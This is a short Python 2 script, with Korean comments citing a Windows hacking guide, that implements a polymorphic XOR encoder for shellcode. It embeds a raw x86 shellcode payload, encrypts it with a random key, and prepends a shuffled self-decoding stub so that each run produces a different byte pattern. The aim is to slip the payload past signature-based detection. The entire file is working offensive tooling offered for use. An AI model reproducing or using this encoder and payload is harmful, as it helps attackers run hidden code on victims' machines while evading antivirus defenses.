#!/usr/bin/env python
#-*- coding: utf-8 -*-
'''
    python ==> 윈도우해킹가이드, 쉘코드를 계속 변하는 인코딩 기법을 사용해 감싸는 코드
                               polymorphic XOR shellcode Encoder
'''
import os
import struct
import random

print " * Advanced XOR Shell code by edward"

def xor(data,key):
	leng = len(key)
	xor1 = ""
	reverse =""
	for i in range(0, len(data)):
		reverse += struct.pack("B", (ord(data[i]) ^ ord(key[i % leng])))
	return reverse

def conv_hex(data):
	hex_str = ""
	for i in range(0, len(data)):
		hex_str += ("0x%02x" % ord(data[i])).replace('0x','\\x')
	return hex_str


org_shellcode = (
  "\xdb\xc8\xbb\x0d\xbc\xa0\xbe\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
  "\x30\x31\x58\x17\x03\x58\x17\x83\xe5\x40\x42\x4b\x09\x50\x01"
  "\xb4\xf1\xa1\x66\x3c\x14\x90\xa6\x5a\x5d\x83\x16\x28\x33\x28"
  "\xdc\x7c\xa7\xbb\x90\xa8\xc8\x0c\x1e\x8f\xe7\x8d\x33\xf3\x66"
  "\x0e\x4e\x20\x48\x2f\x81\x35\x89\x68\xfc\xb4\xdb\x21\x8a\x6b"
  "\xcb\x46\xc6\xb7\x60\x14\xc6\xbf\x95\xed\xe9\xee\x08\x65\xb0"
  "\x30\xab\xaa\xc8\x78\xb3\xaf\xf5\x33\x48\x1b\x81\xc5\x98\x55"
  "\x6a\x69\xe5\x59\x99\x73\x22\x5d\x42\x06\x5a\x9d\xff\x11\x99"
  "\xdf\xdb\x94\x39\x47\xaf\x0f\xe5\x79\x7c\xc9\x6e\x75\xc9\x9d"
  "\x28\x9a\xcc\x72\x43\xa6\x45\x75\x83\x2e\x1d\x52\x07\x6a\xc5"
  "\xfb\x1e\xd6\xa8\x04\x40\xb9\x15\xa1\x0b\x54\x41\xd8\x56\x33"
  "\x94\x6e\xed\x71\x96\x70\xed\x25\xff\x41\x66\xaa\x78\x5e\xad"
  "\x8e\x77\x14\xef\xa7\x1f\xf1\x7a\xfa\x7d\x02\x51\x39\x78\x81"
  "\x53\xc2\x7f\x99\x16\xc7\xc4\x1d\xcb\xb5\x55\xc8\xeb\x6a\x55"
  "\xd9\x88\xe1\xcd\xe2"
	)

xor_shellcode = ""
xor_key = os.urandom(4)

# 아래 decoder 3개가 계속 바뀌면서 실행된다
decoder1 = "\xe8\xff\xff\xff\xff\xc2\x5e"                     # GetPC
decoder2 = "\x6a" + chr( (len(org_shellcode)/4) + 1 ) + "\x59" # Counter
decoder3 = "\xbf" + xor_key                                   # XOR Key

decoder_rand = [decoder1, decoder2, decoder3]
random.shuffle(decoder_rand)
decoder = "".join(decoder_rand)

getpc_offset = len(decoder) - decoder.index(decoder1) + 3
decoder4_1 = "\x31\x7e" + chr(getpc_offset)                   # xor [esi+12], edi
decoder4_2 = "\x83\xc6\x04"                                   # add esi,4
decoder4_3 = "\xe2\xf8"                                       # loop xor
decoder4 = decoder4_1 + decoder4_2 + decoder4_3

decoder += decoder4

xor_shellcode = xor(org_shellcode, xor_key)
print "Original : " + conv_hex(org_shellcode) + '\n'
print "Encoded : " + conv_hex(decoder) + conv_hex(xor_shellcode) + '\n'
